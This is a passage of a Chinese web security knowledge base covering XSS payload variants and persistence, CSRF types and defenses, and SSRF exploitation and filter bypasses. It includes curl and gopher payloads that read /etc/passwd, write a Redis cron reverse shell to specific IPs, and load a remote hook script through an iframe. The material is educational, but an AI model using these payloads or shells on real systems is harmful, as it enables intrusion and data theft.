<div><code class="docutils literal notranslate"><span class="pre">&quot;&gt;&lt;img</span> <span class="pre">src=x</span> <span class="pre">onerror=alert(document.cookie)&gt;.gif</span></code></div></blockquote>
</div>
<div class="section" id="id6">
<h5>过期的payload<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>src=javascript:alert基本不可以用</li>
<li>css expression特性只在旧版本ie可用</li>
</ul>
</div>
<div class="section" id="css">
<h5>css<a class="headerlink" href="#css" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">div</span> <span class="n">style</span><span class="o">=</span><span class="s2">&quot;background-image:url(javascript:alert(/xss/))&quot;</span><span class="o">&gt;</span>
<span class="o">&lt;</span><span class="n">STYLE</span><span class="o">&gt;</span><span class="nd">@import</span><span class="s1">&#39;http://ha.ckers.org/xss.css&#39;</span><span class="p">;</span><span class="o">&lt;/</span><span class="n">STYLE</span><span class="o">&gt;</span>
</pre></div>
</div>
</div>
<div class="section" id="markdown">
<h5>markdown<a class="headerlink" href="#markdown" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>[a](javascript:prompt(document.cookie))
[a](j    a   v   a   s   c   r   i   p   t:prompt(document.cookie))
&lt;&amp;#x6A&amp;#x61&amp;#x76&amp;#x61&amp;#x73&amp;#x63&amp;#x72&amp;#x69&amp;#x70&amp;#x74&amp;#x3A&amp;#x61&amp;#x6C&amp;#x65&amp;#x72&amp;#x74&amp;#x28&amp;#x27&amp;#x58&amp;#x53&amp;#x53&amp;#x27&amp;#x29&gt;
![a&#39;&quot;`onerror=prompt(document.cookie)](x)
[notmalicious](javascript:window.onerror=alert;throw%20document.cookie)
[a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
![a](data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=)
</pre></div>
</div>
</div>
<div class="section" id="iframe">
<h5>iframe<a class="headerlink" href="#iframe" title="永久链接至标题">¶</a></h5>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="o">&lt;</span><span class="n">iframe</span> <span class="n">onload</span><span class="o">=</span><span class="s1">&#39;</span>
    <span class="n">var</span> <span class="n">sc</span>   <span class="o">=</span> <span class="n">document</span><span class="o">.</span><span class="n">createElement</span><span class="p">(</span><span class="s2">&quot;scr&quot;</span> <span class="o">+</span> <span class="s2">&quot;ipt&quot;</span><span class="p">);</span>
    <span class="n">sc</span><span class="o">.</span><span class="n">type</span>  <span class="o">=</span> <span class="s2">&quot;text/javascr&quot;</span> <span class="o">+</span> <span class="s2">&quot;ipt&quot;</span><span class="p">;</span>
    <span class="n">sc</span><span class="o">.</span><span class="n">src</span>   <span class="o">=</span> <span class="s2">&quot;http://1.2.3.4/js/hook.js&quot;</span><span class="p">;</span>
    <span class="n">document</span><span class="o">.</span><span class="n">body</span><span class="o">.</span><span class="n">appendChild</span><span class="p">(</span><span class="n">sc</span><span class="p">);</span>
    <span class="s1">&#39;</span>
<span class="o">/&gt;</span>
</pre></div>
</div>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=javascript:alert(1)&gt;&lt;/iframe&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=&quot;data:text/html,&lt;iframe</span> <span class="pre">src=javascript:alert('M')&gt;&lt;/iframe&gt;&quot;&gt;&lt;/iframe&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=data:text/html;base64,PGlmcmFtZSBzcmM9amF2YXNjcmlwdDphbGVydCgiTWFubml4Iik+PC9pZnJhbWU+&gt;&lt;/iframe&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">srcdoc=&lt;svg/o&amp;#x6E;load&amp;equals;alert&amp;lpar;1)&amp;gt;&gt;&lt;/iframe&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=https://baidu.com</span> <span class="pre">width=1366</span> <span class="pre">height=768&gt;&lt;/iframe&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;iframe</span> <span class="pre">src=javascript:alert(1)</span> <span class="pre">width=1366</span> <span class="pre">height=768&gt;&lt;/iframe</span></code></li>
</ul>
</div>
<div class="section" id="form">
<h5>form<a class="headerlink" href="#form" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">&lt;form</span> <span class="pre">action=javascript:alert(1)&gt;&lt;input</span> <span class="pre">type=submit&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;button</span> <span class="pre">formaction=javascript:alert(1)&gt;M</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;input</span> <span class="pre">formaction=javascript:alert(1)</span> <span class="pre">type=submit</span> <span class="pre">value=M&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;input</span> <span class="pre">formaction=javascript:alert(1)</span> <span class="pre">type=image</span> <span class="pre">value=M&gt;</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">&lt;form&gt;&lt;input</span> <span class="pre">formaction=javascript:alert(1)</span> <span class="pre">type=image</span> <span class="pre">src=1&gt;</span></code></li>
</ul>
</div>
<div class="section" id="meta">
<h5>meta<a class="headerlink" href="#meta" title="永久链接至标题">¶</a></h5>
<p><code class="docutils literal notranslate"><span class="pre">&lt;META</span> <span class="pre">HTTP-EQUIV=&quot;Link&quot;</span> <span class="pre">Content=&quot;&lt;http://ha.ckers.org/xss.css&gt;;</span> <span class="pre">REL=stylesheet&quot;&gt;</span></code></p>
</div>
</div>
<span id="document-vuln/xss/rootkit"></span><div class="section" id="id1">
<h4>持久化<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="id2">
<h5>基于存储<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>有时候网站会将信息存储在Cookie或localStorage，而因为这些数据一般是网站主动存储的，很多时候没有对Cookie或localStorage中取出的数据做过滤，会直接将其取出并展示在页面中，甚至存了JSON格式的数据时，部分站点存在 <code class="docutils literal notranslate"><span class="pre">eval(data)</span></code> 之类的调用。因此当有一个XSS时，可以把payload写入其中，在对应条件下触发。</p>
<p>在一些条件下，这种利用方式可能因为一些特殊字符造成问题，可以使用 <code class="docutils literal notranslate"><span class="pre">String.fromCharCode</span></code> 来绕过。</p>
</div>
<div class="section" id="service-worker">
<h5>Service Worker<a class="headerlink" href="#service-worker" title="永久链接至标题">¶</a></h5>
<p>Service Worker可以拦截http请求，起到类似本地代理的作用，故可以使用Service Worker Hook一些请求，在请求中返回攻击代码，以实现持久化攻击的目的。</p>
<p>在Chrome中，可通过 <code class="docutils literal notranslate"><span class="pre">chrome://inspect/#service-workers</span></code> 来查看Service Worker的状态，并进行停止。</p>
</div>
<div class="section" id="appcache">
<h5>AppCache<a class="headerlink" href="#appcache" title="永久链接至标题">¶</a></h5>
<p>在可控的网络环境下（公共wifi），可以使用AppCache机制，来强制存储一些Payload，未清除的情况下，用户访问站点时对应的payload会一直存在。</p>
</div>
</div>
<span id="document-vuln/xss/ref"></span><div class="section" id="id1">
<h4>参考链接<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<div class="section" id="wiki">
<h5>wiki<a class="headerlink" href="#wiki" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/UltimateHackers/AwesomeXSS">AwesomeXSS</a></li>
<li><a class="reference external" href="https://w3c.github.io/webappsec-csp/">w3c</a></li>
<li><a class="reference external" href="https://github.com/wisec/domxsswiki/wiki">dom xss wiki</a></li>
<li><a class="reference external" href="https://content-security-policy.com/">content-security-policy.com</a></li>
<li><a class="reference external" href="https://shubs.io/exploiting-markdown-syntax-and-telescope-persistent-xss-through-markdown-cve-2014-5144/">markdwon xss</a></li>
<li><a class="reference external" href="https://brutelogic.com.br/blog/cheat-sheet/">xss cheat sheet</a></li>
<li><a class="reference external" href="https://html5sec.org/">html5 security cheatsheet</a></li>
<li><a class="reference external" href="https://www.netsparker.com/whitepaper-http-security-headers/">http security headers</a></li>
<li><a class="reference external" href="https://github.com/cure53/XSSChallengeWiki/wiki">XSSChallengeWiki</a></li>
</ul>
</div>
<div class="section" id="challenges">
<h5>Challenges<a class="headerlink" href="#challenges" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://xss-game.appspot.com">XSS Challenge By Google</a></li>
<li><a class="reference external" href="http://prompt.ml/0">prompt to win</a></li>
</ul>
</div>
<div class="section" id="css">
<h5>CSS<a class="headerlink" href="#css" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://www.thespanner.co.uk/2014/03/21/rpo/">rpo</a></li>
<li><a class="reference external" href="http://www.zjicmisa.org/index.php/archives/127/">rpo攻击初探</a></li>
<li><a class="reference external" href="https://curesec.com/blog/article/blog/Reading-Data-via-CSS-Injection-180.html">Reading Data via CSS</a></li>
<li><a class="reference external" href="http://mksben.l0.cm/2015/10/css-based-attack-abusing-unicode-range.html">css based attack abusing unicode range</a></li>
<li><a class="reference external" href="https://speakerdeck.com/lmt_swallow/css-injection-plus-plus-ji-cun-shou-fa-falsegai-guan-todui-ce">css injection</a></li>
<li><a class="reference external" href="https://blog.sheddow.xyz/css-timing-attack/">css timing attack</a></li>
</ul>
</div>
<div class="section" id="id3">
<h5>同源策略<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://developer.mozilla.org/en-US/docs/Web/Security/Same-origin_policy">Same origin policy</a></li>
<li><a class="reference external" href="https://www.bedefended.com/papers/cors-security-guide">cors security guide</a></li>
<li><a class="reference external" href="https://speakerdeck.com/shhnjk/logically-bypassing-browser-security-boundaries">logically bypassing browser security boundaries</a></li>
</ul>
</div>
<div class="section" id="bypass">
<h5>bypass<a class="headerlink" href="#bypass" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://gist.github.com/JohannesHoppe/5612274">666 lines of xss payload</a></li>
<li><a class="reference external" href="https://github.com/masatokinugawa/filterbypass">xss auditor bypass</a></li>
<li><a class="reference external" href="https://www.leavesongs.com/HTML/chrome-xss-auditor-bypass-collection.html">xss auditor bypass writeup</a></li>
<li><a class="reference external" href="https://portswigger.net/blog/bypassing-csp-using-polyglot-jpegs">bypassing csp using polyglot jpegs</a></li>
<li><a class="reference external" href="https://www.secjuice.com/bypass-xss-filters-using-javascript-global-variables/">bypass xss filters using javascript global variables</a></li>
</ul>
</div>
<div class="section" id="id4">
<h5>持久化<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="http://drops.wooyun.org/web/10798">变种XSS 持久控制 by tig3r</a></li>
<li><a class="reference external" href="https://sakurity.com/blog/2015/08/13/middlekit.html">Using Appcache and ServiceWorker for Evil</a></li>
</ul>
</div>
<div class="section" id="tricks">
<h5>Tricks<a class="headerlink" href="#tricks" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li><a class="reference external" href="https://github.com/etherdream/sw-sec">Service Worker 安全探索</a></li>
<li><a class="reference external" href="https://github.com/EtherDream/web-frontend-magic">前端黑魔法</a></li>
</ul>
</div>
</div>
</div>
</div>
<span id="document-vuln/csrf"></span><div class="section" id="csrf">
<h3>CSRF<a class="headerlink" href="#csrf" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>跨站请求伪造 (Cross-Site Request Forgery, CSRF)，也被称为 One Click Attack 或者 Session Riding ，通常缩写为CSRF，是一种对网站的恶意利用。尽管听起来像XSS，但它与XSS非常不同，XSS利用站点内的信任用户，而CSRF则通过伪装来自受信任用户的请求来利用受信任的网站。</p>
</div>
<div class="section" id="id2">
<h4>分类<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<div class="section" id="id3">
<h5>资源包含<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h5>
<p>资源包含是在大多数介绍CSRF概念的演示或基础课程中可能看到的类型。这种类型归结为控制HTML标签（例如&lt;image&gt;、&lt;audio&gt;、&lt;video&gt;、&lt;object&gt;、&lt;script&gt;等）所包含的资源的攻击者。如果攻击者能够影响URL被加载的话，包含远程资源的任何标签都可以完成攻击。</p>
<p>由于缺少对Cookie的源点检查，如上所述，此攻击不需要XSS，可以由任何攻击者控制的站点或站点本身执行。此类型仅限于GET请求，因为这些是浏览器对资源URL唯一的请求类型。这种类型的主要限制是它需要错误地使用安全的HTTP请求方式。</p>
</div>
<div class="section" id="id4">
<h5>基于表单<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h5>
<p>通常在正确使用安全的请求方式时看到。攻击者创建一个想要受害者提交的表单; 其包含一个JavaScript片段，强制受害者的浏览器提交。</p>
<p>该表单可以完全由隐藏的元素组成，以致受害者很难发现它。</p>
<p>如果处理cookies不当，攻击者可以在任何站点上发动攻击，只要受害者使用有效的cookie登录，攻击就会成功。如果请求是有目的性的，成功的攻击将使受害者回到他们平时正常的页面。该方法对于攻击者可以将受害者指向特定页面的网络钓鱼攻击特别有效。</p>
</div>
<div class="section" id="xmlhttprequest">
<h5>XMLHttpRequest<a class="headerlink" href="#xmlhttprequest" title="永久链接至标题">¶</a></h5>
<p>XMLHttpRequest可能是最少看到的方式，由于许多现代Web应用程序依赖XHR，许多应用花费大量的时间来构建和实现这一特定的对策。</p>
<p>基于XHR的CSRF通常由于SOP而以XSS有效载荷的形式出现。没有跨域资源共享策略 (Cross-Origin Resource Sharing, CORS)，XHR仅限于攻击者托管自己的有效载荷的原始请求。</p>
<p>这种类型的CSRF的攻击有效载荷基本上是一个标准的XHR，攻击者已经找到了一些注入受害者浏览器DOM的方式。</p>
</div>
</div>
<div class="section" id="id5">
<h4>防御<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>通过CSRF-token或者验证码来检测用户提交</li>
<li>验证 Referer/Content-Type</li>
<li>对于用户修改删除等操作最好都使用POST操作</li>
<li>避免全站通用的Cookie，严格设置Cookie的域</li>
</ul>
</div>
<div class="section" id="id6">
<h4>参考链接<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="https://www.github.com/jrozner/csrf-demo">demo</a></li>
<li><a class="reference external" href="https://medium.com/&#64;jrozner/wiping-out-csrf-ded97ae7e83f">Wiping Out CSRF</a></li>
<li><a class="reference external" href="https://www.slideshare.net/0ang3el/neat-tricks-to-bypass-csrfprotection">Neat tricks to bypass CSRF protection</a></li>
</ul>
</div>
</div>
<span id="document-vuln/ssrf"></span><div class="section" id="ssrf">
<h3>SSRF<a class="headerlink" href="#ssrf" title="永久链接至标题">¶</a></h3>
<div class="section" id="id1">
<h4>简介<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h4>
<p>服务端请求伪造（Server Side Request Forgery, SSRF）指的是攻击者在未能取得服务器所有权限时，利用服务器漏洞以服务器的身份发送一条构造好的请求给服务器所在内网。SSRF攻击通常针对外部网络无法直接访问的内部系统。</p>
<div class="section" id="id2">
<h5>漏洞危害<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h5>
<p>SSRF可以对外网、服务器所在内网、本地进行端口扫描，攻击运行在内网或本地的应用，或者利用File协议读取本地文件。</p>
<p>内网服务防御相对外网服务来说一般会较弱，甚至部分内网服务为了运维方便并没有对内网的访问设置权限验证，所以存在SSRF时，通常会造成较大的危害。</p>
</div>
</div>
<div class="section" id="id3">
<h4>利用方式<a class="headerlink" href="#id3" title="永久链接至标题">¶</a></h4>
<p>SSRF利用存在多种形式以及不同的场景，针对不同场景可以使用不同的利用和绕过方式。</p>
<p>以curl为例, 可以使用dict协议操作Redis、file协议读文件、gopher协议反弹Shell等功能，常见的Payload如下：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">curl</span> <span class="o">-</span><span class="n">vvv</span> <span class="s1">&#39;dict://127.0.0.1:6379/info&#39;</span>

<span class="n">curl</span> <span class="o">-</span><span class="n">vvv</span> <span class="s1">&#39;file:///etc/passwd&#39;</span>

<span class="c1"># * 注意: 链接使用单引号，避免$变量问题</span>

<span class="n">curl</span> <span class="o">-</span><span class="n">vvv</span> <span class="s1">&#39;gopher://127.0.0.1:6379/_*1</span><span class="si">%0d%0a</span><span class="s1">$8</span><span class="si">%0d%0a</span><span class="s1">flushall</span><span class="si">%0d%0a</span><span class="s1">*3</span><span class="si">%0d%0a</span><span class="s1">$3</span><span class="si">%0d%0a</span><span class="s1">set</span><span class="si">%0d%0a</span><span class="s1">$1</span><span class="si">%0d%0a</span><span class="s1">1</span><span class="si">%0d%0a</span><span class="s1">$64</span><span class="si">%0d%0a%0d%0a%0a%0a</span><span class="s1">*/1 * * * * bash -i &gt;&amp; /dev/tcp/103.21.140.84/6789 0&gt;&amp;1</span><span class="si">%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a</span><span class="s1">*4</span><span class="si">%0d%0a</span><span class="s1">$6</span><span class="si">%0d%0a</span><span class="s1">config</span><span class="si">%0d%0a</span><span class="s1">$3</span><span class="si">%0d%0a</span><span class="s1">set</span><span class="si">%0d%0a</span><span class="s1">$3</span><span class="si">%0d%0a</span><span class="s1">dir</span><span class="si">%0d%0a</span><span class="s1">$16</span><span class="si">%0d%0a</span><span class="s1">/var/spool/cron/</span><span class="si">%0d%0a</span><span class="s1">*4</span><span class="si">%0d%0a</span><span class="s1">$6</span><span class="si">%0d%0a</span><span class="s1">config</span><span class="si">%0d%0a</span><span class="s1">$3</span><span class="si">%0d%0a</span><span class="s1">set</span><span class="si">%0d%0a</span><span class="s1">$10</span><span class="si">%0d%0a</span><span class="s1">dbfilename</span><span class="si">%0d%0a</span><span class="s1">$4</span><span class="si">%0d%0a</span><span class="s1">root</span><span class="si">%0d%0a</span><span class="s1">*1</span><span class="si">%0d%0a</span><span class="s1">$4</span><span class="si">%0d%0a</span><span class="s1">save</span><span class="si">%0d%0a</span><span class="s1">quit</span><span class="si">%0d%0a</span><span class="s1">&#39;</span>
</pre></div>
</div>
</div>
<div class="section" id="id4">
<h4>相关危险函数<a class="headerlink" href="#id4" title="永久链接至标题">¶</a></h4>
<p>SSRF涉及到的危险函数主要是网络访问，支持伪协议的网络读取。以PHP为例，涉及到的函数有 <code class="docutils literal notranslate"><span class="pre">file_get_contents()</span></code> / <code class="docutils literal notranslate"><span class="pre">fsockopen()</span></code> / <code class="docutils literal notranslate"><span class="pre">curl_exec()</span></code> 等。</p>
</div>
<div class="section" id="id5">
<h4>过滤绕过<a class="headerlink" href="#id5" title="永久链接至标题">¶</a></h4>
<div class="section" id="ip">
<h5>更改IP地址写法<a class="headerlink" href="#ip" title="永久链接至标题">¶</a></h5>
<p>一些开发者会通过对传过来的URL参数进行正则匹配的方式来过滤掉内网IP，如采用如下正则表达式：</p>
<ul class="simple">
<li><code class="docutils literal notranslate"><span class="pre">^10(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){3}$</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">^172\.([1][6-9]|[2]\d|3[01])(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</span></code></li>
<li><code class="docutils literal notranslate"><span class="pre">^192\.168(\.([2][0-4]\d|[2][5][0-5]|[01]?\d?\d)){2}$</span></code></li>
</ul>
<p>对于这种过滤我们采用改编IP的写法的方式进行绕过，例如192.168.0.1这个IP地址可以被改写成：</p>
<ul class="simple">
<li>8进制格式：0300.0250.0.1</li>
<li>16进制格式：0xC0.0xA8.0.1</li>
<li>10进制整数格式：3232235521</li>
<li>16进制整数格式：0xC0A80001</li>
<li>合并后两位：1.1.278 / 1.1.755</li>
<li>合并后三位：1.278 / 1.755 / 3.14159267</li>
</ul>
<p>另外IP中的每一位，各个进制可以混用。</p>
<p>访问改写后的IP地址时，Apache会报400 Bad Request，但Nginx、MySQL等其他服务仍能正常工作。</p>
<p>另外，0.0.0.0这个IP可以直接访问到本地，也通常被正则过滤遗漏。</p>
</div>
<div class="section" id="id6">
<h5>使用解析到内网的域名<a class="headerlink" href="#id6" title="永久链接至标题">¶</a></h5>
<p>如果服务端没有先解析IP再过滤内网地址，我们就可以使用localhost等解析到内网的域名。</p>
<p>另外 <code class="docutils literal notranslate"><span class="pre">xip.io</span></code> 提供了一个方便的服务，这个网站的子域名会解析到对应的IP，例如192.168.0.1.xip.io，解析到192.168.0.1。</p>
</div>
<div class="section" id="url">
<h5>利用解析URL所出现的问题<a class="headerlink" href="#url" title="永久链接至标题">¶</a></h5>
<p>在某些情况下，后端程序可能会对访问的URL进行解析，对解析出来的host地址进行过滤。这时候可能会出现对URL参数解析不当，导致可以绕过过滤。</p>
<p>比如 <code class="docutils literal notranslate"><span class="pre">http://www.baidu.com&#64;192.168.0.1/</span></code> 当后端程序通过不正确的正则表达式（比如将http之后到com为止的字符内容，也就是www.baidu.com，认为是访问请求的host地址时）对上述URL的内容进行解析的时候，很有可能会认为访问URL的host为www.baidu.com，而实际上这个URL所请求的内容都是192.168.0.1上的内容。</p>
</div>
<div class="section" id="id7">
<h5>利用跳转<a class="headerlink" href="#id7" title="永久链接至标题">¶</a></h5>
<p>如果后端服务器在接收到参数后，正确的解析了URL的host，并且进行了过滤，我们这个时候可以使用跳转的方式来进行绕过。</p>
<p>可以使用如 <a class="reference external" href="http://httpbin.org/redirect-to?url=http://192.168.0.1">http://httpbin.org/redirect-to?url=http://192.168.0.1</a> 等服务跳转，但是由于URL中包含了192.168.0.1这种内网IP地址，可能会被正则表达式过滤掉，可以通过短地址的方式来绕过。</p>
<p>常用的跳转有302跳转和307跳转，区别在于307跳转会转发POST请求中的数据等，但是302跳转不会。</p>
</div>
<div class="section" id="http">
<h5>通过各种非HTTP协议<a class="headerlink" href="#http" title="永久链接至标题">¶</a></h5>
<p>如果服务器端程序对访问URL所采用的协议进行验证的话，可以通过非HTTP协议来进行利用。</p>
<p>比如通过gopher，可以在一个url参数中构造POST或者GET请求，从而达到攻击内网应用的目的。例如可以使用gopher协议对与内网的Redis服务进行攻击，可以使用如下的URL：</p>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1* * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/23330&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
</pre></div>
</div>
<p>除了gopher协议，File协议也是SSRF中常用的协议，该协议主要用于访问本地计算机中的文件，我们可以通过类似 <code class="docutils literal notranslate"><span class="pre">file:///path/to/file</span></code> 这种格式来访问计算机本地文件。使用file协议可以避免服务端程序对于所访问的IP进行的过滤。例如我们可以通过 <code class="docutils literal notranslate"><span class="pre">file:///d:/1.txt</span></code> 来访问D盘中1.txt的内容。</p>
</div>
<div class="section" id="dns-rebinding">
<h5>DNS Rebinding<a class="headerlink" href="#dns-rebinding" title="永久链接至标题">¶</a></h5>
<p>一个常用的防护思路是：对于用户请求的URL参数，首先服务器端会对其进行DNS解析，然后对于DNS服务器返回的IP地址进行判断，如果在黑名单中，就禁止该次请求。</p>
<p>但是在整个过程中，第一次去请求DNS服务进行域名解析到第二次服务端去请求URL之间存在一个时间差，利用这个时间差，可以进行DNS重绑定攻击。</p>
<p>要完成DNS重绑定攻击，我们需要一个域名，并且将这个域名的解析指定到我们自己的DNS Server，在我们的可控的DNS Server上编写解析服务，设置TTL时间为0。这样就可以进行攻击了，完整的攻击流程为：</p>
<ul class="simple">
<li>服务器端获得URL参数，进行第一次DNS解析，获得了一个非内网的IP</li>
<li>对于获得的IP进行判断，发现为非黑名单IP，则通过验证</li>
<li>服务器端对于URL进行访问，由于DNS服务器设置的TTL为0，所以再次进行DNS解析，这一次DNS服务器返回的是内网地址。</li>
<li>由于已经绕过验证，所以服务器端返回访问内网资源的结果。</li>
</ul>
</div>
<div class="section" id="ipv6">
<h5>利用IPv6<a class="headerlink" href="#ipv6" title="永久链接至标题">¶</a></h5>
<p>有些服务没有考虑IPv6的情况，但是内网又支持IPv6，则可以使用IPv6的本地IP如 <code class="docutils literal notranslate"><span class="pre">[::]</span></code> <code class="docutils literal notranslate"><span class="pre">0000::1</span></code> 或IPv6的内网域名来绕过过滤。</p>
</div>
<div class="section" id="idn">
<h5>利用IDN<a class="headerlink" href="#idn" title="永久链接至标题">¶</a></h5>
<p>一些网络访问工具如Curl等是支持国际化域名（Internationalized Domain Name，IDN）的，国际化域名又称特殊字符域名，是指部分或完全使用特殊的文字或字母组成的互联网域名。</p>
<p>在这些字符中，部分字符会在访问时做一个等价转换，例如 <code class="docutils literal notranslate"><span class="pre">ⓔⓧⓐⓜⓟⓛⓔ.ⓒⓞⓜ</span></code> 和 <code class="docutils literal notranslate"><span class="pre">example.com</span></code> 等同。利用这种方式，可以用 <code class="docutils literal notranslate"><span class="pre">①</span> <span class="pre">②</span> <span class="pre">③</span> <span class="pre">④</span> <span class="pre">⑤</span> <span class="pre">⑥</span> <span class="pre">⑦</span> <span class="pre">⑧</span> <span class="pre">⑨</span> <span class="pre">⑩</span></code> 等字符绕过内网限制。</p>
</div>
</div>
<div class="section" id="id8">
<h4>可能的利用点<a class="headerlink" href="#id8" title="永久链接至标题">¶</a></h4>
<div class="section" id="id9">
<h5>内网服务<a class="headerlink" href="#id9" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>Apache Hadoop远程命令执行</li>
<li>axis2-admin部署Server命令执行</li>
<li>Confluence SSRF</li>
<li>counchdb WEB API远程命令执行</li>
<li>dict</li>
<li>docker API远程命令执行</li>
<li>Elasticsearch引擎Groovy脚本命令执行</li>
<li>ftp / ftps（FTP爆破）</li>
<li>glassfish任意文件读取和war文件部署间接命令执行</li>
<li>gopher</li>
<li>HFS远程命令执行</li>
<li>http、https</li>
<li>imap/imaps/pop3/pop3s/smtp/smtps（爆破邮件用户名密码）</li>
<li>Java调试接口命令执行</li>
<li>JBOSS远程Invoker war命令执行</li>
<li>Jenkins Scripts接口命令执行</li>
<li>ldap</li>
<li>mongodb</li>
<li>php_fpm/fastcgi 命令执行</li>
<li>rtsp - smb/smbs（连接SMB）</li>
<li>sftp</li>
<li>ShellShock 命令执行</li>
<li>Struts2 命令执行</li>
<li>telnet</li>
<li>tftp（UDP协议扩展）</li>
<li>tomcat命令执行</li>
<li>WebDav PUT上传任意文件</li>
<li>WebSphere Admin可部署war间接命令执行</li>
<li>zentoPMS远程命令执行</li>
</ul>
</div>
<div class="section" id="redis">
<h5>Redis利用<a class="headerlink" href="#redis" title="永久链接至标题">¶</a></h5>
<ul class="simple">
<li>写ssh公钥</li>
<li>写crontab</li>
<li>写WebShell</li>
<li>Windows写启动项</li>
<li>主从复制加载 .so 文件</li>
<li>主从复制写无损文件</li>
</ul>
</div>
<div class="section" id="id10">
<h5>云主机<a class="headerlink" href="#id10" title="永久链接至标题">¶</a></h5>
<p>在AWS、Google等云环境下，通过访问云环境的元数据API或管理API，在部分情况下可以实现敏感信息等效果。</p>
</div>
</div>
<div class="section" id="id11">
<h4>防御方式<a class="headerlink" href="#id11" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li>过滤返回的信息</li>
<li>统一错误信息</li>
<li>限制请求的端口</li>
<li>禁止不常用的协议</li>
<li>对DNS Rebinding，考虑使用DNS缓存或者Host白名单</li>
</ul>
</div>
<div class="section" id="id12">
<h4>参考链接<a class="headerlink" href="#id12" title="永久链接至标题">¶</a></h4>
<ul class="simple">
<li><a class="reference external" href="http://www.91ri.org/17111.html">SSRF漏洞分析与利用</a></li>
<li><a class="reference external" href="https://www.blackhat.com/docs/us-17/thursday/us-17-Tsai-A-New-Era-Of-SSRF-Exploiting-URL-Parser-In-Trending-Programming-Languages.pdf">A New Era Of SSRF</a></li>
<li><a class="reference external" href="https://medium.com/secjuice/php-ssrf-techniques-9d422cb28d51">php ssrf technique</a></li>
<li><a class="reference external" href="https://www.leavesongs.com/PYTHON/defend-ssrf-vulnerable-in-python.html">谈一谈如何在Python开发中拒绝SSRF漏洞</a></li>
<li><a class="reference external" href="http://blog.safebuff.com/2016/07/03/SSRF-Tips/">SSRF Tips</a></li>
<li><a class="reference external" href="https://joychou.org/web/phpssrf.html">SSRF in PHP</a></li>
</ul>
</div>
</div>
<span id="document-vuln/cmdinjection"></span><div class="section" id="id1">
<h3>命令注入<a class="headerlink" href="#id1" title="永久链接至标题">¶</a></h3>
<div class="section" id="id2">
<h4>简介<a class="headerlink" href="#id2" title="永久链接至标题">¶</a></h4>
<p>命令注入通常因为指Web应用在服务器上拼接系统命令而造成的漏洞。</p>
<p>该类漏洞通常出现在调用外部程序完成一些功能的情景下。比如一些Web管理界面的配置主机名/IP/掩码/网关、查看系统信息以及关闭重启等功能，或者一些站点提供如ping、nslookup、提供发送邮件、转换图片等功能都可能出现该类漏洞。</p>
</div>
<div class="section" id="id3">
